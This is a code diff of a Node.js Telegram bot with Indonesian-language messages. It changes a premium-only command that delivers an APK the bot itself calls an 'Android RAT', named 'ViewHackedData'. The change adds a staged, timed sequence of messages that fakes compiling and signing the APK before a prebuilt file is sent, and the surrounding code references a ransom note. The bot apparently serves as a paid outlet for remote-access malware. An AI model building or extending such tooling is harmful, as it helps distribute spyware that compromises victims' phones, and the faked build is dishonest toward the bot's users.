@@ -627,17 +627,33 @@ ${ransomNote}
         if (!user || !user.isPremium) {
             return bot.sendMessage(chatId, "Maaf, perintah ini hanya untuk pengguna Premium.");
         }
+
+        const buildMessage = await bot.sendMessage(chatId, "Memulai simulasi build APK untuk Android...");
+
+        const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
         try {
+            await sleep(2000);
+            await bot.editMessageText("... (1/4) Mempersiapkan lingkungan build & OpenJDK...", { chat_id: chatId, message_id: buildMessage.message_id });
+            await sleep(3000);
+            await bot.editMessageText("... (2/4) Mengunduh dependensi Gradle...", { chat_id: chatId, message_id: buildMessage.message_id });
+            await sleep(4000);
+            await bot.editMessageText("... (3/4) Compiling Java source code...", { chat_id: chatId, message_id: buildMessage.message_id });
+            await sleep(3000);
+            await bot.editMessageText("... (4/4) Membuat & menandatangani file .apk...", { chat_id: chatId, message_id: buildMessage.message_id });
+            await sleep(2000);
+
             const apkPath = path.join(__dirname, 'ViewHackedData_#1_1.3.apk');
             if (fs.existsSync(apkPath)) {
-                await bot.sendMessage(chatId, "⏳ Mengirim file APK, mohon tunggu...");
+                await bot.deleteMessage(chatId, buildMessage.message_id);
+                await bot.sendMessage(chatId, "✅ Build Selesai! Mengirim file APK...");
                 await bot.sendDocument(chatId, apkPath, {}, { caption: "Berikut adalah file APK untuk Android RAT." });
             } else {
-                await bot.sendMessage(chatId, "Maaf, file APK tidak dapat ditemukan di server.");
+                await bot.editMessageText("❌ Gagal! File APK sumber tidak dapat ditemukan di server.", { chat_id: chatId, message_id: buildMessage.message_id });
             }
         } catch (error) {
-            console.error("Gagal mengirim file APK:", error);
-            await bot.sendMessage(chatId, "Terjadi kesalahan saat mencoba mengirim file APK.");
+            console.error("Gagal dalam simulasi build APK:", error);
+            await bot.editMessageText(`❌ Terjadi kesalahan: ${error.message}`, { chat_id: chatId, message_id: buildMessage.message_id });
         }
         return;
     }
